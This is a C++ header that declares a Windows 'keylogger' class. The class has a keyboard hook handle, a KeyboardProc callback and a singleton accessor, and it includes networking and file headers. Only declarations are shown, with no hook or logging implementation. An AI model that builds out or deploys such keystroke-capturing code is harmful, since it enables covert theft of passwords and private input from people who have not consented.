#pragma once

#ifdef _WIN32
#define _WIN32_WINNT 0x0A00
#endif

#include "WinSock2.h"
#include <iostream>
#include <Windows.h>
#include <fstream>

class keylogger
{
public:
    keylogger();
    
    ~keylogger();


private:
    static HHOOK hook;

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    static keylogger& GetInstance();
    

};